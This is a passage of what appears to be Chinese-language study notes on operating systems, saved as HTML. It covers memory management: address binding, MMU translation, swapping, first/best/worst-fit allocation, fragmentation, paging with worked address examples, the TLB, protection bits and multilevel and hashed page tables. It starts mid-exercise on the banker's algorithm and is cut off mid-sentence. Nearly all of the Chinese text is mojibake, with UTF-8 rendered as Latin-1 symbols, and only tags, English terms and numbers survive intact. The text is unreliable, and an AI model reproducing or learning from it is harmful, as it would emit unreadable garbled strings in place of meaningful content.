NeedçŸ©é˜µçš„å†…å®¹æ˜¯</p><p>P<sub>0</sub>(0 0 0 0),</p><p>P<sub>1</sub>(0 7 5 0),</p><p>P<sub>2</sub>(1 0 0 2),</p><p>P<sub>3</sub>(0 0 2 0),</p><p>P<sub>4</sub>(0 6 4 0)ã€‚</p><p>b. ç³»ç»Ÿå¤„äºå®‰å…¨çŠ¶æ€ï¼Œ å› ä¸ºAvailableçŸ©é˜µç­‰äº(1 5 2 0),è¿›ç¨‹P<sub>0</sub>å’ŒP<sub>3</sub>éƒ½å¯ä»¥è¿è¡Œï¼Œ<br>å½“è¿›ç¨‹P<sub>3</sub>è¿è¡Œå®Œæ—¶ï¼Œå®ƒé‡Šæ”¾å®ƒçš„èµ„æºï¼Œè€Œå…è®¸å…¶å®ƒè¿›ç¨‹è¿è¡Œã€‚</p><p>c. å¯ä»¥è¢«æ»¡è¶³ï¼Œæ»¡è¶³ä»¥åï¼Œ AvailableçŸ©é˜µç­‰äº(1 1 0 0) ï¼Œå½“ä»¥æ¬¡åºP<sub>0</sub>,P<sub>1</sub>,P<sub>2</sub>, P<sub>3</sub>,P<sub>4</sub>è¿è¡Œæ—¶<br>ï¼Œå¯ä»¥å®Œæˆè¿è¡Œã€‚</p><h1 id="ç¬¬8ç« -å†…å­˜ç®¡ç†"><a class="markdownIt-Anchor" href="#ç¬¬8ç« -å†…å­˜ç®¡ç†"></a> ç¬¬8ç«  å†…å­˜ç®¡ç†</h1><h2 id="81-èƒŒæ™¯"><a class="markdownIt-Anchor" href="#81-èƒŒæ™¯"></a> 8.1 èƒŒæ™¯</h2><h3 id="811-åŸºæœ¬ç¡¬ä»¶"><a class="markdownIt-Anchor" href="#811-åŸºæœ¬ç¡¬ä»¶"></a> 8.1.1 åŸºæœ¬ç¡¬ä»¶</h3><p>åŸºåœ°å€å¯„å­˜å™¨å«æœ‰æœ€å°çš„åˆæ³•ç‰©ç†å†…å­˜åœ°å€ï¼Œ</p><p>è€Œç•Œé™åœ°å€å¯„å­˜å™¨å†³å®šäº†èŒƒå›´çš„å¤§å°ã€‚</p><p><img src="/posts/8ce3e425/image-20220110151139132.png" alt="image-20220110151139132"></p><p><img src="/posts/8ce3e425/image-20220110151147020.png" alt="image-20220110151147020"></p><h3 id="812-åœ°å€ç»‘å®š"><a class="markdownIt-Anchor" href="#812-åœ°å€ç»‘å®š"></a> 8.1.2 åœ°å€ç»‘å®š</h3><p>å°†æŒ‡ä»¤ä¸æ•°æ®ç»‘å®šåˆ°å†…å­˜åœ°å€æœ‰ä»¥ä¸‹å‡ ç§æƒ…å†µï¼š</p><ul><li>ç¼–è¯‘æ—¶(compile time)ï¼šå¦‚æœåœ¨ç¼–è¯‘æ—¶å°±çŸ¥é“è¿›ç¨‹å°†åœ¨å†…å­˜ä¸­çš„é©»ç•™åœ°å€ï¼Œé‚£ä¹ˆå°±å¯ä»¥ç”Ÿæˆç»å¯¹ä»£ç ï¼ˆabsolute codeï¼‰ã€‚</li><li>åŠ è½½æ—¶(load timeï¼‰ï¼šå¦‚æœåœ¨ç¼–è¯‘æ—¶å¹¶ä¸çŸ¥é“è¿›ç¨‹å°†é©»ç•™åœ¨å†…å­˜çš„ä»€ä¹ˆåœ°æ–¹ï¼Œé‚£ä¹ˆç¼–è¯‘å™¨å°±å¿…é¡»ç”Ÿæˆå¯é‡å®šä½ä»£ç  ï¼ˆrelocatable codeï¼‰ã€‚</li><li>æ‰§è¡Œæ—¶(execution timeï¼‰ï¼šå¦‚æœè¿›ç¨‹åœ¨æ‰§è¡Œæ—¶å¯ä»¥ä»ä¸€ä¸ªå†…å­˜æ®µç§»åˆ°å¦ä¸€ä¸ªå†…å­˜æ®µï¼Œé‚£ä¹ˆç»‘å®šå¿…é¡»å»¶è¿Ÿåˆ°æ‰§è¡Œæ—¶æ‰è¿›è¡Œã€‚</li></ul><h3 id="813-é€»è¾‘åœ°å€ç©ºé—´ä¸ç‰©ç†åœ°å€ç©ºé—´"><a class="markdownIt-Anchor" href="#813-é€»è¾‘åœ°å€ç©ºé—´ä¸ç‰©ç†åœ°å€ç©ºé—´"></a> 8.1.3 é€»è¾‘åœ°å€ç©ºé—´ä¸ç‰©ç†åœ°å€ç©ºé—´</h3><p>CPUæ‰€ç”Ÿæˆçš„åœ°å€é€šå¸¸ç§°ä¸º<strong>é€»è¾‘åœ°å€</strong>ï¼ˆlogical addressï¼‰ï¼Œè€Œå†…å­˜å•å…ƒæ‰€çœ‹åˆ°çš„åœ°å€ï¼ˆå³åŠ è½½åˆ°å†…å­˜åœ°å€å¯„å­˜å™¨ï¼ˆmemory-address registerï¼‰ä¸­çš„åœ°å€ï¼‰ é€šå¸¸ç§°ä¸º<strong>ç‰©ç†åœ°å€</strong> ï¼ˆphysical addressï¼‰</p><p>è¿è¡Œæ—¶ä»è™šæ‹Ÿåœ°å€åˆ°ç‰©ç†åœ°å€çš„æ˜ å°„æ˜¯ç”±è¢«ç§°ä¸º<strong>å†…å­˜ç®¡ç†å•å…ƒ</strong>ï¼ˆ memory-managementunit, <strong>MMU</strong>ï¼‰ çš„ç¡¬ä»¶è®¾å¤‡æ¥å®Œæˆçš„ã€‚</p><p><img src="/posts/8ce3e425/image-20220111210939563.png" alt="image-20220111210939563"></p><h3 id="814-åŠ¨æ€åŠ è½½"><a class="markdownIt-Anchor" href="#814-åŠ¨æ€åŠ è½½"></a> 8.1.4 åŠ¨æ€åŠ è½½</h3><p>åŠ¨æ€åŠ è½½ï¼šå°†åŠ è½½å»¶è¿Ÿåˆ°è¿è¡Œæ—¶</p><p>é‡‡ç”¨<strong>åŠ¨æ€åŠ è½½</strong>æ—¶ï¼Œä¸€ä¸ªå­ç¨‹åºåªæœ‰åœ¨è°ƒç”¨æ—¶æ‰è¢«åŠ è½½ã€‚æ‰€æœ‰å­ç¨‹åºéƒ½ä»¥å¯é‡å®šä½çš„å½¢å¼ä¿å­˜åœ¨ç£ç›˜ä¸Šã€‚ ä¸»ç¨‹åºè£…å…¥å†…å­˜å¹¶æ‰§è¡Œã€‚ å½“ä¸€ä¸ªå­ç¨‹åºéœ€è¦è°ƒç”¨å¦ä¸€ä¸ªå­ç¨‹åºæ—¶ï¼Œè°ƒç”¨å­ç¨‹åºé¦–å…ˆæ£€æŸ¥å¦ä¸€ä¸ªå­ç¨‹åºæ˜¯å¦å·±åŠ è½½ã€‚å¦‚æœæ²¡æœ‰ï¼Œå¯é‡å®šä½çš„é“¾æ¥ç¨‹åºå°†ç”¨æ¥åŠ è½½æ‰€éœ€è¦çš„å­ç¨‹åºï¼Œå¹¶æ›´æ–°ç¨‹åºçš„åœ°å€è¡¨ä»¥åæ˜ è¿™ä¸€å˜åŒ–ã€‚æ¥ç€ï¼Œæ§åˆ¶ä¼ é€’ç»™æ–°åŠ è½½çš„å­ç¨‹åºã€‚</p><p>åŠ¨æ€åŠ è½½çš„ä¼˜ç‚¹æ˜¯ä¸ç”¨çš„å­ç¨‹åºå†³ä¸ä¼šè¢«åŠ è½½ã€‚</p><h3 id="815-åŠ¨æ€é“¾æ¥ä¸å…±äº«åº“"><a class="markdownIt-Anchor" href="#815-åŠ¨æ€é“¾æ¥ä¸å…±äº«åº“"></a> 8.1.5 åŠ¨æ€é“¾æ¥ä¸å…±äº«åº“</h3><p>åŠ¨æ€é“¾æ¥ï¼šå°†é“¾æ¥å»¶è¿Ÿåˆ°è¿è¡Œæ—¶ã€‚</p><p>ä¼˜ç‚¹ï¼š</p><ul><li><p>ä½¿ç”¨è¯­è¨€åº“çš„æ‰€æœ‰è¿›ç¨‹åªéœ€è¦ä¸€ä¸ªåº“ä»£ç å‰¯æœ¬</p></li><li><p>å¯ç”¨äºåº“æ›´æ–°ï¼ˆå¦‚ä¿®æ”¹æ¼æ´ã€‰ã€‚ ä¸€ä¸ªåº“å¯ä»¥è¢«æ–°çš„ç‰ˆæœ¬æ‰€æ›¿ä»£ä¸”ä½¿ç”¨è¯¥åº“çš„æ‰€æœ‰ç¨‹åºä¼šè‡ªåŠ¨ä½¿ç”¨æ–°çš„ç‰ˆæœ¬ã€‚</p></li></ul><h2 id="82äº¤æ¢"><a class="markdownIt-Anchor" href="#82äº¤æ¢"></a> 8.2äº¤æ¢</h2><p>è¿›ç¨‹å¯ä»¥æš‚æ—¶ä»å†…å­˜ä¸­äº¤æ¢ï¼ˆswapï¼‰åˆ°å¤‡ä»½å­˜å‚¨(backing storeï¼‰ä¸Šï¼Œ å½“éœ€è¦å†æ¬¡æ‰§è¡Œæ—¶å†è°ƒå›åˆ°å†…å­˜ä¸­ã€‚</p><p>è¿™ç§äº¤æ¢ç­–ç•¥çš„å˜ç§è¢«ç”¨åœ¨åŸºäºä¼˜å…ˆçº§çš„è°ƒåº¦ç®—æ³•ä¸­ã€‚ å¦‚æœæœ‰ä¸€ä¸ªæ›´é«˜ä¼˜å…ˆçº§çš„è¿›ç¨‹ä¸”éœ€è¦æœåŠ¡ï¼Œå†…å­˜ç®¡ç†å™¨å¯ä»¥äº¤æ¢å‡ºä½ä¼˜å…ˆçº§çš„è¿›ç¨‹ï¼Œä»¥ä¾¿å¯ä»¥è£…å…¥å’Œæ‰§è¡Œæ›´é«˜ä¼˜å…ˆçº§çš„è¿›ç¨‹ã€‚ å½“æ›´é«˜ä¼˜å…ˆçº§çš„è¿›ç¨‹æ‰§è¡Œå®Œåï¼Œä½ä¼˜å…ˆçº§è¿›ç¨‹å¯ä»¥äº¤æ¢å›å†…å­˜ä»¥ç»§ç»­æ‰§è¡Œã€‚ è¿™ç§äº¤æ¢æœ‰æ—¶ç§°ä¸ºæ»šå‡º(roll out)å’Œæ»šå…¥(roll in)ã€‚</p><h2 id="83-è¿ç»­å†…å­˜åˆ†é…"><a class="markdownIt-Anchor" href="#83-è¿ç»­å†…å­˜åˆ†é…"></a> 8.3 è¿ç»­å†…å­˜åˆ†é…</h2><h3 id="831-å†…å­˜æ˜ å°„ä¸ä¿æŠ¤"><a class="markdownIt-Anchor" href="#831-å†…å­˜æ˜ å°„ä¸ä¿æŠ¤"></a> 8.3.1 å†…å­˜æ˜ å°„ä¸ä¿æŠ¤</h3><p>é‡å®šä½å¯„å­˜å™¨å«æœ‰æœ€å°çš„ç‰©ç†åœ°å€å€¼ï¼šç•Œé™åœ°å€å¯„å­˜å™¨å«æœ‰é€»è¾‘åœ°å€çš„èŒƒå›´å€¼ã€‚</p><p>æ¯ä¸ªé€»è¾‘åœ°å€å¿…é¡»å°äºç•Œé™åœ°å€å¯„å­˜å™¨ã€‚ <strong>MMU</strong>åŠ¨æ€æå°†é€»è¾‘åœ°å€åŠ ä¸Šé‡å®šä½å¯„å­˜å™¨çš„å€¼åæ˜ å°„æˆç‰©ç†åœ°å€ã€‚ æ˜ å°„åçš„ç‰©ç†åœ°å€å†é€äº¤å†…å­˜å•å…ƒï¼ˆè§å›¾ 8.6ï¼‰ã€‚</p><p><img src="/posts/8ce3e425/image-20220110154530899.png" alt="image-20220110154530899"></p><h3 id="832-å†…å­˜åˆ†é…"><a class="markdownIt-Anchor" href="#832-å†…å­˜åˆ†é…"></a> 8.3.2 å†…å­˜åˆ†é…</h3><p>åœ¨ä»»æ„æ—¶å€™ï¼Œæœ‰ä¸€ç»„å¯ç”¨å­”ï¼ˆå—ï¼‰ å¤§å°åˆ—è¡¨å’Œè¾“å…¥é˜Ÿåˆ—ã€‚æ“ä½œç³»ç»Ÿæ ¹æ®è°ƒåº¦ç®—æ³•æ¥å¯¹è¾“å…¥é˜Ÿåˆ—è¿›è¡Œæ’åºã€‚å†…å­˜ä¸æ–­åœ°åˆ†é…ç»™è¿›ç¨‹ï¼Œ ç›´åˆ°ä¸‹ä¸€ä¸ªè¿›ç¨‹çš„å†…å­˜éœ€æ±‚ä¸èƒ½æ»¡è¶³ä¸ºæ­¢ï¼Œè¿™æ—¶æ²¡æœ‰è¶³å¤Ÿå¤§çš„å¯ç”¨å­”æ¥è£…å…¥è¿›ç¨‹ã€‚æ“ä½œç³»ç»Ÿå¯ä»¥ç­‰åˆ°æœ‰è¶³å¤Ÿå¤§çš„ç©ºé—´ï¼Œæˆ–è€…å¾€ä¸‹æ‰«æè¾“å…¥é˜Ÿåˆ—ä»¥ç¡®å®šæ˜¯å¦æœ‰å…¶ä»–å†…å­˜éœ€æ±‚è¾ƒå°çš„è¿›ç¨‹å¯ä»¥è¢«æ»¡è¶³ã€‚</p><p>ä»ä¸€ç»„å¯ç”¨å­”ä¸­é€‰æ‹©ä¸€ä¸ªç©ºé—²å­”çš„æœ€ä¸ºå¸¸ç”¨æ–¹æ³•æœ‰é¦–æ¬¡é€‚åº”ï¼ˆfirSt-fitï¼‰ï¼‡ æœ€ä½³é€‚åº”ï¼ˆbest-fitï¼‰ã€ æœ€å·®é€‚åº”ï¼ˆworst-fitï¼‰ã€‚</p><ul><li>**é¦–æ¬¡é€‚åº”ï¼š**åˆ†é…ç¬¬ä¸€ä¸ªè¶³å¤Ÿå¤§çš„å­”ã€‚ æŸ¥æ‰¾å¯ä»¥ä»å¤´å¼€å§‹ï¼Œä¹Ÿå¯ä»¥ä»ä¸Šæ¬¡é¦–æ¬¡é€‚åº”ç»“æŸæ—¶å¼€å§‹ã€‚ä¸€æ—¦æ‰¾åˆ°è¶³å¤Ÿå¤§çš„ç©ºé—²å­”ï¼Œå°±å¯ä»¥åœæ­¢ã€‚<ul><li>ç‰¹ç‚¹ï¼šä¼˜å…ˆåˆ†é…å†…å­˜ä¸­ä½åœ°å€éƒ¨åˆ†</li><li>ä¼˜ç‚¹ï¼šç®€å•</li><li>ç¼ºç‚¹ï¼šåœ¨ä½åœ°å€éƒ¨åˆ†ä¼šç§¯ç´¯å¤§é‡å¤–é›¶å¤´</li></ul></li><li>**æœ€ä½³é€‚åº”ï¼š**æœç´¢æ•´ä¸ªåºåˆ—ï¼Œæ‰¾åˆ°é€‚åˆæ¡ä»¶çš„æœ€å°çš„åˆ†åŒºè¿›è¡Œåˆ†é…ã€‚ è¿™ç§æ–¹æ³•å¯ä»¥äº§ç”Ÿæœ€å°å‰©ä½™å­”ã€‚<ul><li>ä¼˜ç‚¹ï¼šä¿è¯æ€»æœ‰å¤§åˆ†åŒºå¯åˆ†é…ï¼ˆæ’åœ¨åé¢ï¼‰</li><li>ç¼ºç‚¹ï¼š<ul><li>æ•ˆç‡ä¸é«˜ï¼Œæ’åœ¨å‰é¢çš„åˆ†åŒºä¸æ–­å˜å°ï¼Œèƒ½è¢«åˆ†å‡ºå»çš„æ¦‚ç‡ä¹Ÿå°±è¶Šæ¥è¶Šä½</li><li>å¤–é›¶å¤´å½¢æˆé€Ÿåº¦å¿«</li></ul></li></ul></li><li>**æœ€å·®é€‚åº”ï¼š**æœç´¢æ•´ä¸ªåºåˆ—ï¼Œå¯»æ‰¾æœ€å¤§çš„åˆ†åŒºè¿›è¡Œåˆ†é…ã€‚è¿™ç§æ–¹æ³•å¯ä»¥äº§ç”Ÿæœ€å¤§å‰©ä½™å­”ï¼Œ è¯¥å­”å¯èƒ½æ¯”æœ€ä½³é€‚åº”æ–¹æ³•äº§ç”Ÿçš„è¾ƒå°å‰©ä½™å­”æ›´ä¸ºæœ‰ç”¨ã€‚<ul><li>ä¼˜ç‚¹ï¼šæŸ¥æ‰¾æ•ˆç‡æ˜¾è‘—æé«˜ï¼Œä¸€æ¬¡å°±æ‰¾åˆ°</li><li>ç¼ºç‚¹ï¼šå¤§ä½œä¸šå®¹çº³èƒ½åŠ›ä¼šä¸‹é™</li></ul></li></ul><h3 id="833-ç¢ç‰‡"><a class="markdownIt-Anchor" href="#833-ç¢ç‰‡"></a> 8.3.3 ç¢ç‰‡</h3><p>é¦–æ¬¡é€‚åº”æ–¹æ³•å’Œæœ€ä½³é€‚åº”æ–¹æ³•ç®—æ³•éƒ½æœ‰å¤–éƒ¨ç¢ç‰‡é—®é¢˜ã€‚</p><p>éšç€è¿›ç¨‹è£…å…¥å’Œç§»å‡ºå†…å­˜ï¼Œç©ºé—²å†…å­˜ç©ºé—´è¢«åˆ†ä¸ºå°ç‰‡æ®µã€‚å½“æ‰€æœ‰æ€»çš„å¯ç”¨å†…å­˜ä¹‹å’Œå¯ä»¥æ»¡è¶³è¯·æ±‚ï¼Œä½†å¹¶ä¸è¿ç»­æ—¶ï¼Œè¿™å°±å‡ºç°äº†å¤–éƒ¨ç¢ç‰‡é—®é¢˜ã€‚</p><ul><li><p>ä¸€ç§è§£å†³å¤–éƒ¨ç¢ç‰‡é—®é¢˜çš„æ–¹æ³•æ˜¯ç´§ç¼©ã€‚</p><p>ç´§ç¼©çš„ç›®çš„æ˜¯ç§»åŠ¨å†…å­˜å†…å®¹ï¼Œ ä»¥ä¾¿æ‰€æœ‰ç©ºé—²ç©ºé—´åˆå¹¶æˆä¸€æ•´å—ã€‚</p></li><li><p>å¦ä¸€ç§å¯èƒ½è§£å†³å¤–éƒ¨ç¢ç‰‡é—®é¢˜çš„æ–¹æ³•æ˜¯å…è®¸ç‰©ç†åœ°å€ç©ºé—´ä¸ºéè¿ç»­ï¼Œ è¿™æ ·åªè¦æœ‰ç‰©ç†å†…å­˜å°±å¯ä¸ºè¿›ç¨‹åˆ†é…ã€‚ è¿™ç§æ–¹æ¡ˆæœ‰ä¸¤ç§äº’è¡¥çš„å®ç°æŠ€æœ¯ï¼šåˆ†é¡µï¼ˆè§8.4èŠ‚)å’Œåˆ†æ®µï¼ˆè§8.7èŠ‚ï¼‰</p></li></ul><h2 id="84-åˆ†é¡µ"><a class="markdownIt-Anchor" href="#84-åˆ†é¡µ"></a> 8.4 åˆ†é¡µ</h2><h3 id="841-åŸºæœ¬æ–¹æ³•"><a class="markdownIt-Anchor" href="#841-åŸºæœ¬æ–¹æ³•"></a> 8.4.1 åŸºæœ¬æ–¹æ³•</h3><p>å®ç°åˆ†é¡µçš„åŸºæœ¬æ–¹æ³•æ¶‰åŠå°†ç‰©ç†å†…å­˜åˆ†ä¸ºå›ºå®šå¤§å°çš„å—ï¼Œç§°ä¸ºå¸§ï¼ˆframeï¼‰ï¼šè€Œå°†é€»è¾‘å†…å­˜ä¹Ÿåˆ†ä¸ºåŒæ ·å¤§å°çš„å—ï¼Œç§°ä¸ºé¡µï¼ˆpageï¼‰ã€‚</p><p><img src="/posts/8ce3e425/image-20220110162401210.png" alt="image-20220110162401210"></p><p><img src="/posts/8ce3e425/image-20220110163418739.png" alt="image-20220110163418739"></p><p>ç”±CPUç”Ÿæˆçš„æ¯ä¸ªåœ°å€åˆ†ä¸ºä¸¤ä¸ªéƒ¨åˆ†ï¼šé¡µå·ï¼ˆpï¼‰å’Œé¡µåç§»ï¼ˆdï¼‰ã€‚é¡µå·ä½œä¸ºé¡µè¡¨ä¸­çš„ç´¢å¼•ã€‚é¡µè¡¨åŒ…å«æ¯é¡µæ‰€åœ¨ç‰©ç†å†…å­˜çš„åŸºåœ°å€ã€‚</p><p>å¦‚æœé€»è¾‘åœ°å€ç©ºé—´ä¸º2<sup>m</sup>ï¼Œä¸”é¡µå¤§å°ä¸º2<sup>n</sup> å•å…ƒï¼ˆå­—èŠ‚æˆ–å­—ã€‰ï¼Œ é‚£<br>ä¹ˆé€»è¾‘åœ°å€çš„é«˜ m-n ä½è¡¨ç¤ºé¡µå·ï¼Œè€Œä½nä½è¡¨ç¤ºé¡µåç§»ã€‚ è¿™æ ·ï¼Œ é€»è¾‘åœ°å€å¦‚ä¸‹æ‰€ç¤ºï¼š</p><p><img src="/posts/8ce3e425/image-20220110162740496.png" alt="image-20220110162740496"></p><p>è®¾å®šé¡µé¢å¤§å°ä¸º4 byteï¼Œç‰©ç†å†…å­˜æ˜¯32 byteï¼ˆ8 é¡µ)ã€‚é€»è¾‘åœ°å€0 åœ¨ç¬¬0é¡µï¼Œé¡µåç§»ä¸º0ã€‚æ ¹æ®ç´¢å¼•é¡µè¡¨ï¼Œæˆ‘ä»¬å‘ç°ç¬¬0é¡µåœ¨ç¬¬5å¸§ã€‚è¿™æ ·ï¼Œé€»è¾‘åœ°å€0 æ˜ å°„åˆ°ç‰©ç†åœ°å€20 (= (5 Ã— 4) + 0)ã€‚é€»è¾‘åœ°å€3ï¼ˆç¬¬0 é¡µï¼Œé¡µåç§»ä¸º3ï¼‰æ˜ å°„åˆ°ç‰©ç†åœ°å€23 (= (5 Ã— 4) + 3)ã€‚é€»è¾‘åœ°å€4 åœ¨ç¬¬1é¡µï¼Œåç§»é‡ä¸º0ï¼›æ ¹æ®é¡µè¡¨ï¼Œç¬¬1 é¡µè¢«æ˜ å°„åˆ°ç¬¬6 å¸§ã€‚è¿™æ ·ï¼Œé€»è¾‘åœ°å€4 æ˜ å°„åˆ°ç‰©ç†åœ°å€24 (= (6 Ã— 4) + 0)ã€‚é€»è¾‘åœ°å€13æ˜ å°„åˆ°ç‰©ç†åœ°å€9ã€‚</p><p><img src="/posts/8ce3e425/image-20220110163340244.png" alt="image-20220110163340244"></p><p><strong>åˆ†é¡µæœºåˆ¶çš„ç‰¹ç‚¹</strong></p><ul><li>åˆ†é¡µæœºåˆ¶ä¸ä¼šäº§ç”Ÿå¤–éƒ¨ç¢ç‰‡ï¼šä»»ä½•ç©ºé—²å¸§éƒ½è¢«åˆ†é…ç»™æ‰€éœ€çš„è¿›ç¨‹ã€‚</li><li>åˆ†é¡µæœºåˆ¶ä¼šäº§ç”Ÿå†…éƒ¨ç¢ç‰‡ã€‚</li></ul><p>å®ä¾‹ï¼š</p><blockquote><p>1.<img src="/posts/8ce3e425/image-20220110165126064.png" alt="image-20220110165126064"></p><ol start="2"><li></li></ol><p>å­˜å‚¨å™¨çš„ç”¨æˆ·ç©ºé—´å…±æœ‰ 32 ä¸ªé¡µé¢ï¼Œæ¯é¡µ 1KBï¼Œå†…å­˜16KBã€‚å‡å®šæŸæ—¶åˆ»ç³»ç»Ÿä¸ºç”¨æˆ·çš„ç¬¬ 0ã€1ã€2ã€3 é¡µåˆ†åˆ«åˆ†é…çš„ç‰©ç†å—å·ä¸º 5ã€10ã€4ã€7ï¼Œè¯•å°†é€»è¾‘åœ°å€ 0A5C å’Œ093C å˜æ¢ä¸ºç‰©ç†åœ°å€ã€‚</p><p><img src="/posts/8ce3e425/image-20220110165235908.png" alt="image-20220110165235908"></p></blockquote><h3 id="842-ç¡¬ä»¶æ”¯æŒ"><a class="markdownIt-Anchor" href="#842-ç¡¬ä»¶æ”¯æŒ"></a> 8.4.2 ç¡¬ä»¶æ”¯æŒ</h3><p>è½¬æ¢è¡¨ç¼“å†²åŒºï¼ˆtranslation look-aside buffer, TLBï¼‰ã€‚ TLB æ˜¯å…³è”çš„å¿«é€Ÿå†…å­˜ã€‚</p><p>TLB æ¡ç›®ç”±ä¸¤éƒ¨åˆ†ç»„æˆï¼š é”®ï¼ˆæ ‡ç­¾ï¼‰ å’Œå€¼ã€‚ å½“å…³è”å†…å­˜æ ¹æ®ç»™å®šå€¼æŸ¥æ‰¾æ—¶ï¼Œå®ƒä¼šåŒæ—¶ä¸æ‰€æœ‰é”®è¿›è¡Œæ¯”è¾ƒã€‚ å¦‚æœæ‰¾åˆ°æ¡ç›®ï¼Œé‚£ä¹ˆå°±å¾—åˆ°ç›¸åº”çš„å€¼åŸŸã€‚</p><p>TLB ä¸é¡µè¡¨ä¸€èµ·æŒ‰å¦‚ä¸‹æ–¹æ³•ä½¿ç”¨ï¼š</p><ul><li>TLBåªåŒ…æ‹¬é¡µè¡¨ä¸­çš„ä¸€å°éƒ¨åˆ†æ¡ç›®ã€‚å½“CPUäº§ç”Ÿé€»è¾‘åœ°å€åï¼Œå…¶é¡µå·æäº¤ç»™TLBã€‚</li><li>å¦‚æœæ‰¾åˆ°é¡µå·ï¼Œé‚£ä¹ˆä¹Ÿå°±å¾—åˆ°äº†å¸§å·ï¼Œå¹¶å¯ç”¨æ¥è®¿é—®å†…å­˜ã€‚</li><li>å¦‚æœé¡µç ä¸åœ¨ TLB ä¸­ï¼ˆç§°ä¸º TLB å¤±æ•ˆï¼‰ï¼Œé‚£ä¹ˆå°±éœ€è¦è®¿é—®é¡µè¡¨ã€‚å½“å¾—åˆ°å¸§å·åï¼Œå°±å¯ä»¥ç”¨å®ƒæ¥è®¿é—®å†…å­˜ï¼ˆå¦‚å›¾ 8.11 æ‰€ç¤ºï¼‰ã€‚ åŒæ—¶ï¼Œå°†é¡µå·å’Œå¸§å·å¢åŠ åˆ° TLB ä¸­ï¼Œè¿™æ ·ä¸‹æ¬¡å†ç”¨æ—¶å°±å¯å¾ˆå¿«æŸ¥æ‰¾åˆ°ã€‚å¦‚æœ TLB ä¸­çš„æ¡ç›®å·±æ»¡ï¼Œé‚£ä¹ˆæ“ä½œç³»ç»Ÿä¼šé€‰æ‹©ä¸€ä¸ªæ¥æ›¿æ¢ã€‚</li></ul><p><img src="/posts/8ce3e425/image-20220110170044634.png" alt="image-20220110170044634"></p><h3 id="843-ä¿æŠ¤"><a class="markdownIt-Anchor" href="#843-ä¿æŠ¤"></a> 8.4.3 ä¿æŠ¤</h3><p>åœ¨åˆ†é¡µç¯å¢ƒä¸‹ï¼Œå†…å­˜ä¿æŠ¤æ˜¯é€šè¿‡ä¸æ¯ä¸ªå¸§ç›¸å…³è”çš„ä¿æŠ¤ä½æ¥å®ç°çš„ã€‚</p><p>å¯ä»¥ç”¨<strong>ä¸€ä¸ªä½æ¥å®šä¹‰ä¸€ä¸ªé¡µæ˜¯å¯è¯»å†™è¿˜æ˜¯åªè¯»çš„</strong>ã€‚æ¯æ¬¡åœ°å€å¼•ç”¨éƒ½è¦é€šè¿‡é¡µè¡¨æ¥æŸ¥æ‰¾æ­£ç¡®çš„å¸§ç ï¼Œåœ¨è®¡ç®—ç‰©ç†åœ°å€çš„åŒæ—¶ï¼Œå¯ä»¥é€šè¿‡æ£€æŸ¥ä¿æŠ¤ä½æ¥éªŒè¯æœ‰æ²¡æœ‰å¯¹åªè¯»é¡µè¿›è¡Œå†™æ“ä½œã€‚å¯¹åªè¯»é¡µè¿›è¡Œå†™æ“ä½œä¼šå‘æ“ä½œç³»ç»Ÿäº§ç”Ÿç¡¬ä»¶é™·é˜±ã€ˆæˆ–å†…å­˜ä¿æŠ¤å†²çªã€‰</p><p>è¿˜æœ‰ä¸€ä¸ªä½é€šå¸¸ä¸é¡µè¡¨ä¸­çš„æ¯ä¸€æ¡ç›®ç›¸å…³è”ï¼š<strong>æœ‰æ•ˆï¼æ— æ•ˆä½</strong>ã€‚å½“è¯¥ä½ä¸ºæœ‰æ•ˆæ—¶ï¼Œè¡¨ ç¤ºç›¸å…³çš„é¡µåœ¨è¿›ç¨‹çš„é€»è¾‘åœ°å€ç©ºé—´å†…ï¼Œå› æ­¤æ˜¯åˆæ³•ï¼ˆæˆ–æœ‰æ•ˆï¼‰çš„é¡µã€‚å½“è¯¥ä½ä¸ºæ— æ•ˆæ—¶ï¼Œè¡¨ç¤ºç›¸å…³çš„é¡µä¸åœ¨è¿›ç¨‹çš„é€»è¾‘åœ°å€ç©ºé—´å†…ã€‚**é€šå¸¸æ˜¯æŒ‡è¯¥é¡µçš„å†…å®¹ä¸åœ¨å†…å­˜ï¼Œåœ¨ç£ç›˜ä¸Šã€‚**é€šè¿‡ä½¿ç”¨æœ‰æ•ˆä¸€æ— æ•ˆä½å¯ä»¥æ•æ‰åˆ°éæ³•åœ°å€ã€‚æ“ä½œç³»ç»Ÿé€šè¿‡å¯¹è¯¥ä½çš„è®¾ç½®å¯ä»¥å…è®¸æˆ–ä¸å…è®¸å¯¹æŸé¡µçš„è®¿é—®ã€‚</p><h2 id="85-é¡µè¡¨ç»“æ„"><a class="markdownIt-Anchor" href="#85-é¡µè¡¨ç»“æ„"></a> 8.5 é¡µè¡¨ç»“æ„</h2><h3 id="851-å±‚æ¬¡é¡µè¡¨"><a class="markdownIt-Anchor" href="#851-å±‚æ¬¡é¡µè¡¨"></a> 8.5.1 å±‚æ¬¡é¡µè¡¨</h3><p>ä¸¤çº§åˆ†é¡µç®—æ³•ï¼šå°†é¡µè¡¨å†åˆ†é¡µ</p><p><img src="/posts/8ce3e425/image-20220110172004055.png" alt="image-20220110172004055"></p><p><img src="/posts/8ce3e425/image-20220110172010959.png" alt="image-20220110172010959"></p><p><img src="/posts/8ce3e425/image-20220110172019871.png" alt="image-20220110172019871"></p><p>å¯¹äº 64ä½ä½“ç³»ç»“æ„ï¼Œå±‚æ¬¡é¡µè¡¨é€šå¸¸å¹¶ä¸é€‚åˆã€‚</p><h3 id="852-å“ˆå¸Œé¡µè¡¨"><a class="markdownIt-Anchor" href="#852-å“ˆå¸Œé¡µè¡¨"></a> 8.5.2 å“ˆå¸Œé¡µè¡¨</h3><p>å¤„ç†è¶…è¿‡ 32 ä½åœ°å€ç©ºé—´çš„å¸¸ç”¨æ–¹æ³•æ˜¯ä½¿ç”¨<strong>å“ˆå¸Œé¡µè¡¨</strong>ï¼ˆhashed page tableï¼‰ï¼Œå¹¶ä»¥è™šæ‹Ÿé¡µç ä½œä¸ºå“ˆå¸Œå€¼ã€‚å“ˆå¸Œé¡µè¡¨çš„æ¯ä¸€æ¡ç›®éƒ½åŒ…æ‹¬ä¸€ä¸ªé“¾è¡¨çš„å…ƒç´ ï¼Œè¿™äº›å…ƒç´ å“ˆå¸ŒæˆåŒä¸€ä½ç½®ï¼ˆè¦å¤„ç†ç¢°æ’ã€‰ã€‚ æ¯ä¸ªå…ƒç´ æœ‰ 3 ä¸ªåŸŸï¼š</p><p>ï¼ˆ1ï¼‰è™šæ‹Ÿé¡µç ï¼Œ</p><p>ï¼ˆ2ï¼‰æ‰€æ˜ 